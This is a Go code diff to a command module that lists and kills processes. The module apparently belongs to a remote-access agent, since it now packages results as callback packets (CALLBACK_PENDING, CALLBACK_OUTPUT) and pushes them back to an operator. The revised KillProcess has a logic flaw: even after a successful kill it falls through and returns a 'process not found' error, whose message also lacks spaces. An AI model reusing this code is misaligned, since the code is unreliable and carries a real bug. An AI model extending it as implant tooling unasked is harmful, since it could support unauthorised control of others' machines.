@@ -1,14 +1,16 @@
 package command
 
 import (
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"github.com/shirou/gopsutil/v3/process"
+	"main/packet"
 	"main/sysinfo"
 	"strconv"
 )
 
-func ListProcess(pendingRequest []byte) []byte {
+func ListProcess(pendingRequest []byte) error {
 	processes, _ := process.Processes()
 	result := ""
 	for _, p := range processes {
@@ -30,17 +32,26 @@ func ListProcess(pendingRequest []byte) []byte {
 	}
 	//fmt.Println(title)
 
-	return append(pendingRequest, []byte(result)...)
+	resultBytes := append(pendingRequest, []byte(result)...)
+	finalPacket := packet.MakePacket(CALLBACK_PENDING, resultBytes)
+	packet.PushResult(finalPacket)
+	return nil
 }
 
-func KillProcess(pid int32) error {
+func KillProcess(b []byte) error {
+	pid := binary.BigEndian.Uint32(b)
 	processes, err := process.Processes()
 	if err != nil {
 		return err
 	}
 	for _, p := range processes {
-		if p.Pid == pid {
-			return p.Kill()
+		if p.Pid == int32(pid) {
+			err = p.Kill()
+			if err != nil {
+				return err
+			}
+			finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte(fmt.Sprintf("kill process %d success", pid)))
+			packet.PushResult(finalPacket)
 		}
 	}
 	return errors.New("process" + strconv.Itoa(int(pid)) + "not found")
